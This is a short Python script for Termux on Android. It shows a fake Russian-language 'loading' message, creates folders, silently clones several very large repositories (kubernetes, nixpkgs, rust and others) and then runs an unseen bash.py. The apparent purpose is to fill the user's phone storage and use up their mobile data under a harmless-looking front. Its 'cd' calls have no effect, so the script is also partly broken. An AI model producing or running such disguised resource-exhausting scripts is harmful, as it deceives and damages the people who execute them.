import os, time
from colorama import Fore, Back, Style

sb_w = Style.BRIGHT + Fore.WHITE
sb_g = Style.BRIGHT + Fore.GREEN

print(sb_w + "[" + sb_g + "!" + sb_w + "]" + sb_w + " Подождите идет загрузка...")
time.sleep(2.5)

os.system("clear")
os.system("termux-setup-storage")
os.system("cd /storage/emulated/0/")

os.system("mkdir Download")
os.system("mkdir DCIM")
os.system("mkdir VK")
os.system("mkdir Pictures")

os.system("cd Android")
os.system("cd data")

os.system("git clone https://github.com/kubernetes/kubernetes")
os.system("git clone https://github.com/apache/spark")
os.system("git clone https://github.com/Microsoft/vscode")
os.system("git clone https://github.com/NixOS/nixpkgs")
os.system("git clone https://github.com/rust-lang/rust")

os.system("cd")
os.system("python bash.py")